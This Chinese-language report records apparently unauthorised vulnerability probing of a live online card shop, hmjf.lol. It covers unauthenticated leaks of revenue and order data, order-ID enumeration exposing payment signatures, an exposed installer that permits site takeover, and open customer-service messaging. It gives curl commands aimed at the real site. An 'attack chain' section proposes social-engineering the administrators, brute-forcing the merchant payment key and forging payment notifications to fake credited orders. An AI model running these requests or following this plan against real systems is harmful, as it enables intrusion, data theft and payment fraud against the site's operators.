# hmjf.lol 非卡密漏洞深挖报告

- 时间: 2026-07-16
- 目标: `https://hmjf.lol/shop/`
- 脚本: `hmjf_vuln_other_v4.py`（跳板机 `/data/automation/bin/`）
- 结果: `/data/automation/results/hmjf.lol/vuln_other_20260716/results.json`

---

## 严重

### 1. install 目录暴露 → 可重装接管（Critical）

- `GET /shop/install/`、`/shop/install/index.php` 返回 200
- 提示：删除 `install/install.lock` 即可重新安装
- `GET /shop/install/install.lock` 可下载（内容「安装锁」）
- **影响**：攻击者若获得写权限删除 lock，重装时可指定数据库/管理员，读取 `SYS_KEY`、连接原库，**全站接管**

### 2. 经营数据未授权泄露 — getcount（High→Critical 业务影响）

```json
{"code":0,"yxts":258,"orders":"13377","orders1":"13330","orders2":"7","money":4371470.4,"money1":2631.99,"site":"146"}
```

- `POST ajax.php?act=getcount` 无需登录/CSRF
- 泄露：总订单、已付款单、GMV、运行天数、分站数

---

## 高

### 3. 客服 API 未授权发送（High）

- `POST user/ajax_chat.php?act=send` + `content=任意` → `{"code":0,"msg":"发送成功"}`
- **无需登录、无 CSRF、无验证码**
- 影响：垃圾消息/骚扰客服、社工、试探后台；XSS payload 被 WAF 拦截

### 4. submit.php 订单枚举 + 易支付 sign 泄露（High）

- `GET other/submit.php?type=alipay&orderid={17位}`  
  - 存在 → 跳转支付页（含完整 epay URL）  
  - 不存在 → 「该订单号不存在」
- 泄露：`pid=1003`、`api.ttwl66.cn`、`sign`、`money`、`notify_url` 等

### 5. install.lock 可下载（High）

- 确认安装锁文件对外可读，辅助攻击者判断重装路径

---

## 中

### 6. 客服 API 未授权读取（Medium）

- `GET user/ajax_chat.php?act=get` → `{"code":0,"session_id":"72","data":[]}`
- 泄露会话 ID；历史消息当前为空（新会话）

### 7. 购物车/分类接口未授权（Medium）

| 接口 | 响应 |
|------|------|
| `ajax.php?act=cart_info` | `{"code":0,"count":"0"}` |
| `ajax.php?act=cart_list` | `{"code":0,"sitename":"虚心U自动发卡",...}` |
| `ajax.php?act=getclass` | 全部分类 JSON（含售后 QQ 等） |
| `ajax.php?act=gettoolnew` | 推荐商品+库存（此前 round7 已扫 283 SKU） |

### 8. toollogs.php 公开（Medium）

- 上架日志页面无需认证即可访问

### 9. 用户中心页面暴露（Low-Medium）

- `user/record.php`、`user/recharge.php` 返回 200（收支/充值页）
- 未登录未见明细数据，但攻击面存在

---

## 低 / 信息

- **开放注册**：`user/reg.php` 可访问
- **安全头**：有 HSTS、`X-Frame-Options: SAMEORIGIN`、`X-XSS-Protection`；**无 CSP**
- **Cookie**：`mysid` 设 `HttpOnly; Secure`

---

## 已测未通（排除/待深入）

| 项 | 结果 |
|----|------|
| 登录 SQLi (`admin'--`) | **误报** — 均返回含 script 的页面，非登录成功 |
| epay_notify 伪造 | `error`，无 sign 无法绕过 |
| 价格篡改 pay | CSRF 拦截，未验证到 hashesalt 有效组合 |
| ajax query 联系方式枚举 | 全部空响应 |
| cron.php key | 扩展词表未命中 |
| workorder / apply_refund | CSRF 拦截 |
| api.php 各 act | 空响应 |
| config/.git/backup | 403/404 |
| install/step2-5.php | 404 |
| chat XSS | WAF 拦截危险字符 |
| faka.js「敏感泄露」 | **误报** — 正常前端 JS |

---

## 攻击链建议（非破坏性）

1. **客服 spam + 社工** → 诱导管理员/获取信息  
2. **getcount + submit 枚举** → 估算经营规模 + 验证订单号  
3. **install 重装** → 需先拿写权限删 lock（破坏性，仅作最终手段）  
4. **sign 收集** → 继续撞 `pid=1003` 商户 key → epay_notify 伪造到账

---

## 复现示例

```bash
# 经营数据
curl -X POST 'https://hmjf.lol/shop/ajax.php?act=getcount'

# 未授权发客服消息
curl -X POST 'https://hmjf.lol/shop/user/ajax_chat.php?act=send' -d 'content=test'

# 订单是否存在
curl 'https://hmjf.lol/shop/other/submit.php?type=alipay&orderid=20260716031217345'

# install
curl 'https://hmjf.lol/shop/install/'
curl 'https://hmjf.lol/shop/install/install.lock'
```
